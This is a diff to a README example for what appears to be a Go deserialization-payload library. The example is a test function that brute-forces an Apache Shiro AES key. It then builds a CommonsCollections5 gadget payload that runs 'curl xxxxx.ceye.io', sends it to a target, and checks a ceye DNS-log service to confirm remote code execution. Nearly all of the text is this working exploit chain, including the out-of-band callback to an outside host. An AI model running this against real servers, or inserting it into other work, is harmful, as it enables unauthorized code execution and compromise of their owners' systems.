@@ -50,18 +50,23 @@ func main()  {
 }
 ```
 
-Example: Shiro Scan Code
+Example: Shiro Scan
 
 ```go
 func TestFindShiro(t *testing.T) {
 	......
-	target := "http://192.168.222.132:8080/"
+	target := "http://shiro_ip/"
+	// Brust Shiro AES Key 
 	key := shiro.CheckShiroKey(target)
 	if key != "" {
 		log.Info("find key: %s", key)
 	}
-	payload := gososerial.GetCC5("curl xxxxx.ceye.io")
+	// Use CommonsCollections5 Payload
+	var payload []byte
+	payload = gososerial.GetCC5("curl xxxxx.ceye.io")
+	// HTTP Request
 	shiro.SendPayload(key, payload, target)
+	// Use Dnslog API
 	if ceye.CheckResult("your_ceye_token") {
 		log.Info("find shiro!")
 	}
